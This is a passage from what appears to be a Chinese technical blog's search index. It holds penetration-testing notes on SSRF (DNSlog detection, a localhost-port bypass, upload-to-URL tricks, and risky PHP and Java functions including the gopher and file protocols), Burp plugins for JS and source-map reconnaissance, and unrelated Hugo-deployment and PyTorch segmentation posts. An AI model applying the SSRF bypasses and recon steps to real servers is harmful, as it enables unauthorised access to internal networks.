⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 11.DNSlog无回显注入 使用dhsnlog平台/自己搭建 打开apache或者nginx，测试地址修改为web服务地址，然后看日志ail -f /var/log/apache2/access.log 使用tcpdump tcpdump -nne -i eth0 port 6666 # -nne：不把端口和网络地址转换成名称，在输出行打印数据链路层的头部信息； # -i：监视指定网络接口的数据包。 12.加端口 若限制了子网段，可以添加 :80 端口绕过： http://127.0.0.1:8080 13.其他 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:6:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简单验证流程 之前由于疏忽了，看到dnslog回显就认为是ssrf，大意了忘了SSRF是服务端发起请求…..(有时候dnslog回显的可能是你本地的ip) 假设对于如下链接： http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png 我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。 可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。 在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:7:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF漏洞代码审计 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:8:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"PHP中 PHP中下面函数的使用不当会导致SSRF: curl() # 利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透 file_get_contents() # 获取文档数据,file_get_contents是把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。 fsockopen() # 初始化一个套接字连接到指定主机,本身就是打开一个网络连接或者Unix套接字连接。 curl_exec() # 获得curl会话的结果 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:8:1","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java中 与PHP不同，Java中的SSRF仅支持sun.net.www.protocol协议下的所有协议：http, https, file, ftp, mailto, jar 及netdoc协议 正由于上述原因，以及传入的url协议必须和重定向后的URL协议一直的原因，使得Java中的SSRF并不能像PHP中一样使用gopher协议来扩展攻击面 对于Java来说： 可以用file协议或nerdoc协议进行列目录操作； 对于无回显的文件读取可以利用ftp协议进行带外攻击（注意java的版本，有的版本的java使用ftp协议也无法读取多行文件） 敏感函数 注意能够发起HTTP请求的类和函数： HttpClient.execute() HttpClient.executeMethod() HttpURLConnection.connect() HttpURLConnection.getInputStream() URL.openStream() HttpServletRequest() BasicHttpEntityEncosingRequest() DefaultBHttpClientConnection() BasicHttpRequest() ImageIO.read() 出来以上函数，还需要关注更多的类，如HttpClient、URL类等，还要根据具体实际场景不同。 通常步骤 首先确定被审计的源程序有哪些功能（通常从其他服务器应用获取数据功能出现的概率较大） 确定好功能后再审计对应功能的源代码，事半功倍 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:8:2","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF漏洞防护 正确处理302跳转（在业务角度看，不能直接禁止302，而是对跳转的地址重新进行检查）或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址 禁用不需要的协议(如：file:///、gopher://,dict://等)，限制协议为http、https，防止跨协议 设置内网IP黑名单（正确判定内网IP、正确获取host） 在内网防火墙上设置常见的Web端口白名单（防止端口扫描） 统一错误信息，避免用户根据错误信息来判断远端服务器的端口状态 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:9:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"参考 https://zhuanlan.zhihu.com/p/73736127 https://www.cnblogs.com/chalan630/p/17090666.html ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:10:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简述 js文件中会包含大量前端路由和后端api的链接信息，获取到这些链接能提供更多的有效信息。 ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:1:0","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["渗透测试"],"content":"插件推荐 ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:2:0","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["渗透测试"],"content":"Burp JS Link Finder(burp插件) https://github.com/InitRoot/BurpJSLinkFinder 也可在burp的Extender下载 ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:2:1","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["渗透测试"],"content":"burp-clj(burp插件) burp自带的JS Link Finder效果很不错，不过找到的链接不能直接复制使用，需要再做处理，使用起来很不方便，根据js-link-finder,使用burp-clj脚本重新实现，并根据LinkFinder提供的正则表达式，新增了REST API的支持，现在可以直接通过js link对js中找到的链接进行处理，然后作为burp Intruder的payload使用。 安装： 下载burp-clj.jar，并在burp中加载该插件:https://github.com/ntestoc3/burp-clj/releases 添加脚本源：启用burp-clj插件后，切换到Clojure Plugin选项卡,点Add按钮添加脚本源：https://github.com/ntestoc3/burp-scripts (这里使用github地址，也可以git clone下来，使用本地目录)。 添加脚本源之后，点Reload Scripts!加载脚本。 3.启用jslink脚本 在Clojure Plugin选项卡的Scripts List中勾选js link parse的复选框，启用jslink脚本。 使用方法： 浏览器通过burp代理访问网站，jsfind会被动扫描js文件，扫描到含有链接的js文件会生成issue。 JS Links选项卡可以看到所有扫描到的包含链接的js文件，可以同时在左侧列表选择多个js文件(按ctrl或shift多选)，右边列表会显示所有选中js文件中的链接。 针对不需要的链接可以选中后删除，然后通过 删除链接前面的./字符按钮统一链接的格式，方便intruder使用。 注意链接列表中的删除并不会保存，再次切换到对应的js文件，原先的链接还会存在。 Note: 如果浏览器访问过目标网站，则js文件会缓存，再次访问burp里面只能看到304,不会分析文件内容，需要清空缓存并硬性重新加载，用于在burp中获取js内容。 burp项目中的issue信息会保存，但jslink找到的链接不会保存，jslink脚本重新加载的话，已经分析的链接信息会丢失。 也可以使用burp-clj来解析js map文件： 勾选webpack map文件解析，设置保存目录 通过burp代理访问目标站点，如果webpack脚本发现存在js.map文件，就会自动下载，并解包js源码到设置的目录中．并添加相应的issue． ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:2:2","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["渗透测试"],"content":"jsfinder系列 可以自行魔改，或者自动化利用 jsfinder:**可以批量对目标提取：**jsfinder跑一下跑出路径,然后打开burp爆破等操作 https://github.com/Threezh1/JSFinder jsfinder的油猴插件 jsfinderPlus:https://github.com/Roc-L8/JSFinderPlus ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:2:3","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["渗透测试"],"content":"FindSomthing(浏览器插件) 直接安装使用 ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:2:4","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["渗透测试"],"content":"webpack敏感信息插件 Packer-Fuzzer https://github.com/rtcatc/Packer-Fuzzer ","date":"2023-02-07","objectID":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/:2:5","tags":["burpsuire"],"title":"Burp插件推荐-js信息搜集插件","uri":"/burp%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%901/"},{"categories":["工具"],"content":"因为节省时间（懒），所以从网上找了这个方法 ","date":"2023-02-06","objectID":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/:0:0","tags":["博客","hugo","github action"],"title":"使用GithubAction部署Hugo博客","uri":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/"},{"categories":["工具"],"content":"1.新建github仓库 需要新建两个github仓库，我这里是： MyHugoSource: 存储源码 shuai06.github.io:存放发布的静态网页资源 ","date":"2023-02-06","objectID":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/:0:1","tags":["博客","hugo","github action"],"title":"使用GithubAction部署Hugo博客","uri":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/"},{"categories":["工具"],"content":"2.ssh秘钥 ssh-keygen -t rsa - -C \"$(git config user.email)\" # 注意：这次不要直接回车，以免覆盖之前生成的。如果已经有秘钥文件，则需要换一个路径，避免覆盖，我这里为/users/xps/.ssh_action/id_rsa 生成的公钥（我这里是~/.ssh_action/id_rsa.pub ）放到page仓库(shuai06.github.io)中：cat ~/.ssh_action/id_rsa.pub之后复制，来到page仓库点击 Setting - Deploy keys - Add deploy key，名称随意，粘贴进去刚生成的公钥，勾选 Allow write access ,保存。 生成的私钥（我这里是~/.ssh_action/id_rsa ）放到page仓库(MyHugoSource)中：cat ~/.ssh_action/id_rsa之后，来到源码仓库，点击setting-\u003eActions secrets and variables--\u003eactions--\u003enew resposity secert，变量名称这里设置为ACTIONS_DEPLOY_KEY(这里和后面配置文件保持统一即可)， 添加刚刚生成的私钥(id_rsa)， ","date":"2023-02-06","objectID":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/:0:2","tags":["博客","hugo","github action"],"title":"使用GithubAction部署Hugo博客","uri":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/"},{"categories":["工具"],"content":"3.配置github action 注意yaml文件的格式规范 在源码根目录下新建 /.github/workflows/github-actions-demo.yml，内容如下： 可能需要修改的地方为：deploy_key、external_repository、cname name: Auto Deploy hugo on: [push] jobs: Explore-GitHub-Actions: runs-on: ubuntu-latest steps: - name: Check out repository code uses: actions/checkout@v2 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: latest extended: true - name: Build run: hugo - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} # 这里是上面设置的变量，一致即可 external_repository: shuai06/shuai06.github.io # page仓库的路径 publish_branch: main # 分支 publish_dir: ./public # 发布内容的目录 cname: geoer.cn # cname，设置为自己的 commit_message: ${{ github.event.head_commit.message }} 如果有 submodule,需要加上两三行： - name: Check out repository code uses: actions/checkout@v2 with: submodules: recursive # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo ","date":"2023-02-06","objectID":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/:0:3","tags":["博客","hugo","github action"],"title":"使用GithubAction部署Hugo博客","uri":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/"},{"categories":["工具"],"content":"4.整体流程 yam文件需要push上去 这样，一般我写文章的步骤概述为： 在源码文件根目录操作的 hugo new posts/xxx.md # 新建文章 hugo -D # 构建 git add . git commit -m \"(update)提交xxxx\" git push -u origin main 过一会，访问page就可以了 ​ 个人测试成功部署，具体情况请根据实际问题具体分析 ","date":"2023-02-06","objectID":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/:0:4","tags":["博客","hugo","github action"],"title":"使用GithubAction部署Hugo博客","uri":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/"},{"categories":["工具"],"content":"参考文章 https://blog.csdn.net/weixin_43031092/article/details/119900223 https://blog.csdn.net/weixin_41263449/article/details/107584336 https://shenhonglei.blog.csdn.net/article/details/124261204 ","date":"2023-02-06","objectID":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/:0:5","tags":["博客","hugo","github action"],"title":"使用GithubAction部署Hugo博客","uri":"/%E4%BD%BF%E7%94%A8githubaction%E9%83%A8%E7%BD%B2hugo%E5%8D%9A%E5%AE%A2/"},{"categories":["AI"],"content":" 最近碰到torch.argmax的场景，就在这里简单记录一下。这里分二维和三维及以上记录 ","date":"2022-10-21","objectID":"/torch-argmax-%E5%B0%8F%E8%AE%B0/:0:0","tags":["PyTorch","argmax"],"title":"torch.argmax 小记","uri":"/torch-argmax-%E5%B0%8F%E8%AE%B0/"},{"categories":["AI"],"content":"二维 \u003e\u003e\u003e a = torch.rand(15).reshape(3,5) \u003e\u003e\u003e a tensor([[0.7237, 0.6488, 0.2557, 0.0333, 0.4103], [0.8674, 0.7288, 0.3758, 0.6329, 0.9911], [0.4652, 0.1548, 0.8584, 0.4093, 0.2682]]) \u003e\u003e\u003e a.argmax(dim=0) tensor([1, 1, 2, 1, 1]) \u003e\u003e\u003e a.argmax(dim=1) tensor([0, 4, 2]) ","date":"2022-10-21","objectID":"/torch-argmax-%E5%B0%8F%E8%AE%B0/:1:0","tags":["PyTorch","argmax"],"title":"torch.argmax 小记","uri":"/torch-argmax-%E5%B0%8F%E8%AE%B0/"},{"categories":["AI"],"content":"三维及以上 \u003e\u003e\u003e a = torch.rand(30).reshape(2,3,5) \u003e\u003e\u003e a tensor([[[0.6043, 0.8942, 0.6633, 0.7719, 0.3094], [0.3755, 0.5932, 0.0996, 0.8829, 0.4801], [0.1362, 0.4843, 0.2369, 0.3898, 0.5511]], [[0.2321, 0.4191, 0.6576, 0.1157, 0.8961], [0.6723, 0.8386, 0.2332, 0.3209, 0.8477], [0.9402, 0.4330, 0.4449, 0.3894, 0.8684]]]) \u003e\u003e\u003e a.argmax(dim=0) tensor([[0, 0, 0, 0, 1], [1, 1, 1, 0, 1], [1, 0, 1, 0, 1]]) \u003e\u003e\u003e a.argmax(dim=1) tensor([[0, 0, 0, 1, 2], [2, 1, 0, 2, 0]]) \u003e\u003e\u003e a.argmax(dim=2) tensor([[1, 3, 4], [4, 4, 0]]) 四维同理 ","date":"2022-10-21","objectID":"/torch-argmax-%E5%B0%8F%E8%AE%B0/:2:0","tags":["PyTorch","argmax"],"title":"torch.argmax 小记","uri":"/torch-argmax-%E5%B0%8F%E8%AE%B0/"},{"categories":["AI"],"content":"保存模型 在pytorch进行模型保存的时候，一般有两种保存方式: 一种是保存整个模型 另一种是只保存模型的参数 torch.save(model.state_dict(), \"my_model.pth\") # 只保存模型的参数 torch.save(model, \"my_model.pth\") # 保存整个模型 ","date":"2022-10-21","objectID":"/pytorch%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6-pth/:1:0","tags":["pytorch","模型文件"],"title":"PyTorch模型文件.pth浅析","uri":"/pytorch%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6-pth/"},{"categories":["AI"],"content":"后缀的格式 我们在训练模型的时候保存模型一般是保存.pth和.pkl，有时候也用.pt，有什么区别呢？ 其实，他们只是后缀名不同而已,格式没啥区别 一般惯例是使用.pth 另外，为什么会有 .pkl这种后缀名呢？因为Python有一个序列化模块pickle，使用它保存模型时，通常会起一个以.pkl为后缀名的文件。刚好torch.save()也是使用pickle来保存模型的。 ","date":"2022-10-21","objectID":"/pytorch%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6-pth/:2:0","tags":["pytorch","模型文件"],"title":"PyTorch模型文件.pth浅析","uri":"/pytorch%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6-pth/"},{"categories":["AI"],"content":"模型文件浅析 查看一下模型文件 module_save = \"model_save/module_attunet.pkl\" if os.path.exists(module_save): # net.load_state_dict(torch.load(module_save)) a = torch.load(module_save) print(type(a)) # \u003cclass 'collections.OrderedDict'\u003e print(len(a)) # 240 for k in a.keys(): print(k) # 查看键 for k in net.keys(): print(k, net[k].shape, sep=\" \") ","date":"2022-10-21","objectID":"/pytorch%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6-pth/:3:0","tags":["pytorch","模型文件"],"title":"PyTorch模型文件.pth浅析","uri":"/pytorch%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6-pth/"},{"categories":["AI"],"content":"简介 设计了一个简单而强大的深度网络架构U2-Net，用于显著目标检测(SOD)。我们的U2-Net的体系结构是一个两层嵌套的U结构。 该设计有以下两点优势： （1）它能够捕捉更多的上下文信息，因为提出了RSU(ReSidual U-blocks)结构，融合了不同尺度的感受野的特征； （2）它增加了整个架构的深度但并没有显著增加计算成本，因为在这些RSU块中使用了池化操作。 这种架构使我们能够从头开始训练深度网络，而无需使用图像分类任务中的backbone。 ","date":"2022-10-14","objectID":"/u2-net/:1:0","tags":["U2net","语义分割"],"title":"U2-Net","uri":"/u2-net/"},{"categories":["AI"],"content":"网络架构 其中： ","date":"2022-10-14","objectID":"/u2-net/:1:1","tags":["U2net","语义分割"],"title":"U2-Net","uri":"/u2-net/"},{"categories":["AI"],"content":"RSU结构(ReSidual U-blocks) U型嵌套结构： ","date":"2022-10-14","objectID":"/u2-net/:1:2","tags":["U2net","语义分割"],"title":"U2-Net","uri":"/u2-net/"},{"categories":["AI"],"content":"loss 由七个loss相加（一共六层，每一层一个loss。再加上最后mask融合时的一个loss）。 ","date":"2022-10-14","objectID":"/u2-net/:1:3","tags":["U2net","语义分割"],"title":"U2-Net","uri":"/u2-net/"},{"categories":["AI"],"content":"代码 参考的up主的代码：https://github.com/WZMIAOMIAO/deep-learning-for-image-processing/tree/master/pytorch_segmentation/u2net 替换为自己的遥感影像建筑物提取的数据集，简单测试了一下能跑通，代码有点乱还没改 整体目录如下： my_dataset.py import os import torch.utils.data as data import torchvision from PIL import Image class DUTSDataset(data.Dataset): def __init__(self, root: str, train: bool = True, transform=None): self.trans = torchvision.transforms.Compose([ torchvision.transforms.Resize([256, 256]), torchvision.transforms.ToTensor() ]) # 当时简单测试，所以 self.images_dir = \"/home/xps/code/RemoteAICode/pytorch_segement/AttentionUnetTest/dataset/JPEGImages\" self.masks_dir = \"/home/xps/code/RemoteAICode/pytorch_segement/AttentionUnetTest/dataset/SegmentationClass\" self.ids = os.listdir(self.images_dir) self.images_fps = [os.path.join(self.images_dir, image_id) for image_id in self.ids] self.masks_fps = [os.path.join(self.masks_dir, image_id) for image_id in self.ids] def __getitem__(self, idx): image = self.trans(Image.open(self.images_fps[idx])) mask = self.trans(Image.open(self.masks_fps[idx])) return image, mask def __len__(self): return len(self.ids) model.py from typing import Union, List import torch import torch.nn as nn import torch.nn.functional as F class ConvBNReLU(nn.Module): \"\"\"这三个经常一起使用\"\"\" def __init__(self, in_ch: int, out_ch: int, kernel_size: int = 3, dilation: int = 1): # dilation\u003e1代表是膨胀卷积 super().__init__() padding = kernel_size // 2 if dilation == 1 else dilation self.conv = nn.Conv2d(in_ch, out_ch, kernel_size, padding=padding, dilation=dilation, bias=False) self.bn = nn.BatchNorm2d(out_ch) self.relu = nn.ReLU(inplace=True) def forward(self, x: torch.Tensor) -\u003e torch.Tensor: return self.relu(self.bn(self.conv(x))) class DownConvBNReLU(ConvBNReLU): \"\"\"Encoder部分的下采样，卷积，BN，ReLU\"\"\" def __init__(self, in_ch: int, out_ch: int, kernel_size: int = 3, dilation: int = 1, flag: bool = True): super().__init__(in_ch, out_ch, kernel_size, dilation) self.down_flag = flag # 是否启用下采样。默认为True def forward(self, x: torch.Tensor) -\u003e torch.Tensor: if self.down_flag: x = F.max_pool2d(x, kernel_size=2, stride=2, ceil_mode=True) # 两倍下采样 return self.relu(self.bn(self.conv(x))) class UpConvBNReLU(ConvBNReLU): \"\"\"Decoder部分的上采样，卷积，BN，ReLU\"\"\" def __init__(self, in_ch: int, out_ch: int, kernel_size: int = 3, dilation: int = 1, flag: bool = True): super().__init__(in_ch, out_ch, kernel_size, dilation) self.up_flag = flag def forward(self, x1: torch.Tensor, x2: torch.Tensor) -\u003e torch.Tensor: # 两个tensor进行拼接 if self.up_flag: x1 = F.interpolate(x1, size=x2.shape[2:], mode='bilinear', align_corners=False) # 这里采用双线性插值。x2是encoder输出的，.shape[2:]对应 return self.relu(self.bn(self.conv(torch.cat([x1, x2], dim=1)))) class RSU(nn.Module): \"\"\"通用的RSU模块 height：深度，传入不同的height来实现RSU7..6..5...4 ![20221013212413](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20221013212413.png) \"\"\" def __init__(self, height: int, in_ch: int, mid_ch: int, out_ch: int): super().__init__() assert height \u003e= 2 self.conv_in = ConvBNReLU(in_ch, out_ch) encode_list = [DownConvBNReLU(out_ch, mid_ch, flag=False)] # 最开始对应的是encoder中比较特殊的简单的那个模块(左上角) decode_list = [UpConvBNReLU(mid_ch * 2, mid_ch, flag=False)] # 最开始对应的是decoder中比较特殊的简单的那个模块(右下角) for i in range(height - 2): # height - 2就是其中有上下采样的模块的数量 encode_list.append(DownConvBNReLU(mid_ch, mid_ch)) decode_list.append(UpConvBNReLU(mid_ch * 2, mid_ch if i \u003c height - 3 else out_ch)) # 除了最后一个模块之外的，其他都是mid_ch encode_list.append(ConvBNReLU(mid_ch, mid_ch, dilation=2)) # 最后添加一个(最底下的) self.encode_modules = nn.ModuleList(encode_list) self.decode_modules = nn.ModuleList(decode_list) def forward(self, x: torch.Tensor) -\u003e torch.Tensor: x_in = self.conv_in(x) x = x_in encode_outputs = [] # 用来收集每个encoder的输出 for m in self.encode_modules: x = m(x) # 输入的x依次放进去 encode_outputs.append(x) x = encode_outputs.pop() # 最后一个encoder的膨胀卷积的输出弹出来 for m in self.decode_modules: x2 = encode_outputs.pop() x = m(x, x2) # 两个tensor传入到decoder中得到一个输出 return x + x_in # 加上最开始模块的输出 class RSU4F(nn.Module): \"\"\"在RSU4的基础上将所有上下采样替换为膨胀卷积 !","date":"2022-10-14","objectID":"/u2-net/:2:0","tags":["U2net","语义分割"],"title":"U2-Net","uri":"/u2-net/"},{"categories":["AI"],"content":"参考 https://blog.csdn.net/ling620/article/details/110127019 ","date":"2022-10-14","objectID":"/u2-net/:3:0","tags":["U2net","语义分割"],"title":"U2-Net","uri":"/u2-net/"},{"categories":["AI"],"content":"论文简介 论文地址：https://arxiv.org/abs/1804.03999 出自于MIDL2018(深度学习医学影像会议), 论文中提出了一种应用于医学影像的基于attention gate的模型。 Attention UNet使用了标准的 UNet的网络架构，并在UNet的基础上中引入注意力机制，在对编码器每个分辨率上的特征与解码器中对应特征进行拼接之前，使用了一个注意力模块，重新调整了编码器的输出特征。该模块生成一个门控信号，用来控制不同空间位置处特征的重要性。 attention模块用在了skip connection上，原始U-Net只是单纯的把同层的下采样层的特征直接concate到上采样层中，改进后的使用attention模块对下采样层同层和上采样层上一层的特征图进行处理后再和上采样后的特征图进行concate ","date":"2022-10-10","objectID":"/attention-unet/:1:0","tags":["注意力机制","UNet"],"title":"Attention UNet","uri":"/attention-unet/"},{"categories":["AI"],"content":"网络架构 下图即其网络架构，其中红色的部分就是注意力block 与标准UNet整体结构相似，不同的是在红框内增加了attention gate。 在decoder时候，从encoder提取的部分进行了attention gate再进行decoder。 在对 encoder 每个分辨率上的特征与 decoder 中对应特征进行拼接之前，使用了一个AGs，重新调整了encoder的输出特征。该模块生成一个门控信号，用来控制不同空间位置处特征的重要性 有两个输入： x:来自浅层网络部分(跳跃连接的输入) g:来自深层网络部分(前一个block的输入) 通过跳跃连接合并多个比例提取的特征图，以合并组粒度和细粒度的密集预测。粗粒度的特征图会捕获上下文信息，并突出显示前景对象的类别和位置；AG抑制了无关背景区域中的热证响应，而无需在网络之间裁剪ROI。 下面看一下attention gated: 对应前面整体网络结构中的： attention gate的过程： x和g都被送入到1x1卷积中，将它们变为相同数量的通道数，而不改变大小 在上采样操作后(有相同的大小)，他们被累加并通过ReLU 通过另一个1x1的卷积和一个sigmoid，得到一个0到1的重要性分数$\\alpha$，分配给特征图的每个部分 然后用这个注意力图乘以skip输入，产生这个注意力块的最终输出 其中，Attention coefficients(注意力系数)取值范围为0~1, Attention coefficients倾向于在目标器官区域取得大的值，在背景区域取得较小的值，有助于提高图像分割的精度。 ","date":"2022-10-10","objectID":"/attention-unet/:2:0","tags":["注意力机制","UNet"],"title":"Attention UNet","uri":"/attention-unet/"},{"categories":["AI"],"content":"pytorch实现 代码还是有一点问题，先存这里，有问题回来修改 model.py from torch import nn from torch.nn import functional as F import torch from torchvision import models import torchvision class conv_block(nn.Module): # 形状没有发生变化 def __init__(self,ch_in,ch_out): super(conv_block,self).__init__() self.conv = nn.Sequential( nn.Conv2d(ch_in, ch_out, kernel_size=3,stride=1,padding=1,bias=True), nn.BatchNorm2d(ch_out), nn.ReLU(inplace=True), nn.Conv2d(ch_out, ch_out, kernel_size=3,stride=1,padding=1,bias=True), nn.BatchNorm2d(ch_out), nn.ReLU(inplace=True) ) def forward(self,x): x = self.conv(x) return x class up_conv(nn.Module): # 上采样：扩大两倍 def __init__(self,ch_in,ch_out): super(up_conv,self).__init__() self.up = nn.Sequential( nn.Upsample(scale_factor=2), nn.Conv2d(ch_in,ch_out,kernel_size=3,stride=1,padding=1,bias=True), nn.BatchNorm2d(ch_out), nn.ReLU(inplace=True) ) def forward(self,x): x = self.up(x) return x class Attention_block(nn.Module): # self.Att5 = Attention_block(F_g=512, F_l=512, F_int=256) def __init__(self, F_g, F_l, F_int): super(Attention_block, self).__init__() self.W_g = nn.Sequential( nn.Conv2d(F_g, F_int, kernel_size=1, stride=1, padding=0, bias=True), nn.BatchNorm2d(F_int) ) self.W_x = nn.Sequential( nn.Conv2d(F_l, F_int, kernel_size=1, stride=1, padding=0, bias=True), nn.BatchNorm2d(F_int) ) self.psi = nn.Sequential( nn.Conv2d(F_int, 1, kernel_size=1, stride=1, padding=0, bias=True), nn.BatchNorm2d(1), nn.Sigmoid() ) self.relu = nn.ReLU(inplace=True) def forward(self, g, x): # 下采样的gating signal 卷积 g1 = self.W_g(g) # 上采样的 l 卷积 x1 = self.W_x(x) # concat + relu psi = self.relu(g1 + x1) # channel 减为1，并Sigmoid,得到权重矩阵 psi = self.psi(psi) # 返回加权的 x return x * psi class AttentionUnet(nn.Module): def __init__(self, img_ch=3, output_ch=1): super(AttentionUnet, self).__init__() self.Maxpool = nn.MaxPool2d(kernel_size=2, stride=2) self.Conv1 = conv_block(ch_in=img_ch, ch_out=64) self.Conv2 = conv_block(ch_in=64, ch_out=128) self.Conv3 = conv_block(ch_in=128, ch_out=256) self.Conv4 = conv_block(ch_in=256, ch_out=512) self.Conv5 = conv_block(ch_in=512, ch_out=1024) self.Up5 = up_conv(ch_in=1024, ch_out=512) self.Att5 